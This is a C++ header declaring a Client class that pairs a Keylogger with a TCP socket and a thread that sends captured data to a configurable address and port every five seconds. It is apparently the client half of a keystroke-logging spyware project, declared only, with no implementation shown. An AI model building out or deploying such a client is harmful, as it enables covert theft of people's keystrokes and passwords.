#pragma once

#include "tcp_socket.hpp"
#include "keylogger.hpp"
#include <string>
#include <thread>
#include <chrono>

class Client {
public:
    Client(const std::string& address, int port, size_t buffer_limit = 0);
    ~Client();

    bool start();
    void stop();

private:
    void run();
    void send_data();

    std::string address_;
    uint16_t port_;
    size_t buffer_limit_;
    TCPSocket socket_;
    Keylogger keylogger_;
    bool running_;
    std::thread thread_;
    static constexpr auto SEND_INTERVAL = std::chrono::seconds(5);
};
